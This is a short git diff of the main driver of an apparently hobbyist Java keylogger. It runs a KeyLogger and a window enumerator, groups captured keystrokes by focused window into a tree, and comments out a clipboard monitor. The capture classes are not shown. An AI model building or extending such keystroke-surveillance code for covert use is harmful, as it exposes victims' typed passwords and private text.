@@ -1,6 +1,5 @@
 import com.sun.jna.platform.win32.WinDef;
 
-import java.security.Key;
 import java.util.Timer;
 
 public class MainDriver {
@@ -11,7 +10,7 @@ public class MainDriver {
 
     public static void main(String[] args) {
         KeyLogger keyLogger = new KeyLogger();
-        ClipBoardMonitor clipBoardMonitor = new ClipBoardMonitor();
+//        ClipBoardMonitor clipBoardMonitor = new ClipBoardMonitor();
         EnumerateWindows enumerateWindows = new EnumerateWindows();
         int index = 1;
         try {
@@ -28,6 +27,7 @@ public class MainDriver {
                 } catch (InterruptedException e) {
                     e.printStackTrace();// my name is salman and testing. my name is salman.
                 }
+
                 enumerateWindows.run();
                 focusedLoosed = prvCount != EnumerateWindows.getHashMap().size();
                 if (focusedLoosed) {// my name is salman and hello from intellij.
@@ -35,7 +35,7 @@ public class MainDriver {
                     KeyLogger.balancedBST.root = KeyLogger.balancedBST.insert(currentKey, index++ + "," + KeyLogger.linkedList.toString());
                     KeyLogger.linkedList.clear();
                 }
-                clipBoardMonitor.run();
+//                clipBoardMonitor.run();
             }
         } catch (Exception e) {
             throw new RuntimeException(e);
